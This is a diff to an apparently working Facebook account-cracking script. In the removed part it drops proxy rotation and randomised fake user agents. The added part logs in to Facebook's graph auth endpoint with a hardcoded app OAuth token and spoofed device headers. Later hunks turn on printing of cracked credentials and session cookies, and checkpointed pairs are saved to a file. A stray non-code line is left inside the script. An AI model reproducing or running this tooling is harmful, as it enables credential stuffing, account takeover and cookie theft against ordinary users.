@@ -64,36 +64,54 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 #-------checker------#
-def lock_check(uid):
-    sessionx=requests.Session()
-    urlx=f'https://www.facebook.com/p/{uid}'
-    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
-    tx=req.find('title').text
-    if tx =='Facebook':
-        return('LOCK')
-    else:
-        return('LIVE')
-try:
- prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
- open('.prox.txt','w').write(prox)
-except Exception as e:
- print('')
-prox=open('.prox.txt','r').read().splitlines()
-for xd in range(10000):
-    aa='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
-    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
-    c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
+import os, uuid, random
+import requests as r
+
+def login():
+    os.system("clear")
+    print("\033[1;37m")
+    uid = "id lagale"
+    pww = "pass lagale"
+    ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
+    check(uid, pww, ua)
+
+def check(uid, pww, ua):
+    try:
+        data = {
+            "adid": str(uuid.uuid4()),
+            "device_id": str(uuid.uuid4()),
+            "email": uid,
+            "password": pww,
+            "cpl": "true",
+            "source": "device_based_login",
+            "format": "json",
+            "generate_session_cookies": "1",
+            "generate_analytic_claims": "1",
+            "generate_machine_id": "1",
+            "locale": "GB",
+            "country_code": "GB",
+            "client_country_code": "GB",
+            "currently_logged_in_userid": "0",
+        }
+        headers = {
+            "User-Agent": ua,
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Connection-Quality": "EXCELLENT",
+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-HTTP-Engine": "Liger",
+        }
+        url = "https://b-graph.facebook.com/auth/login"
+        result = r.post(url, data=data, headers=headers).json()
+        print(result)
+    except:
+        pass
+
+login()
+
+email or password Laga Lo aur test kro
 logo = ("""
 \033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
 \033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
@@ -283,13 +301,13 @@ def rcrack1(uid,pwx,tl):
                     return 'LOCK'
                 else:
                     print(f"\033[38;5;46m[SHANTO-OK🌻] {uid}|{ps}")
-                    ##print(f'  \r\033[1;92m  [COOKIE] '+coki)
+                    print(f'  \r\033[1;92m  [COOKIE] '+coki)
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                ##print(f"\x1b[38;5;196m[SHANTO-CP❌] {uid}|{ps}")
+                print(f"\x1b[38;5;196m[SHANTO-CP❌] {uid}|{ps}")
                 open('/sdcard/SHANTO-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
